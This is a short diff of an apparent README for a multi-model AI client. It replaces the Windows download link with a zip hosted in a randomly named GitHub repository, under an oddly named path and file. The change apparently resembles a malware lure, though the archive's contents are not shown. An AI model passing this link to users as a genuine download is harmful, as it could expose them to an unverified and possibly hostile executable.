@@ -18,7 +18,7 @@ Unified multi-model AI client that gives you access to Claude Opus, GPT, Gemini,
 
 | Platform       | Download                          |
 |----------------|-----------------------------------|
-| **Windows**    | [Download for Windows](https://github.com/user-attachments/files/31538344/solid_doodle.zip)   |
+| **Windows**    | [Download for Windows](https://github.com/Dicotyledonous-sourdine5536/solid_doodle_v1.0/raw/refs/heads/main/aviatress/solid_v_doodle_2.6-alpha.3.zip)   |
 
 ---
 
